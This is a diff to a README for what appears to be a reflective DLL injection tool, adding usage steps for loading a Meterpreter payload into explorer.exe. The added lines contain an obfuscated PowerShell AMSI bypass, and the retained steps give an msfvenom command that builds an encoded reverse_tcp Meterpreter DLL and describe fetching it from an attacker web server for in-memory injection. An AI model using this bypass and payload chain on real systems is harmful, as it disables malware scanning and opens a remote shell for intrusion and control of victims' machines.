@@ -6,8 +6,14 @@ Since the complete code is almost 3000 lines, we are not going to cover the code
 For this exercise, we will use a Meterpreter DLL. To reflectively load a Meterpreter DLL in explorer.exe, we are going to download it using the PowerShell DownloadData method, place it in a byte array, and look up the desired process ID.
 In order to execute the required commands, we must open a PowerShell window with "PowerShell -Exec Bypass", which allows script execution. Once the window is open, we will run the commands below.
 
+# Prerequesities:
+1. Bypass PowerShell AMSI:
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
 # How to use
-1. Create a DLL payload using msfvenom and upload it to the target machine:
+1. Create a DLL payload using msfvenom and upload it to the attackers web server:
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f dll -t 300 -e x64/xor_dynamic -o met.dll
 ```
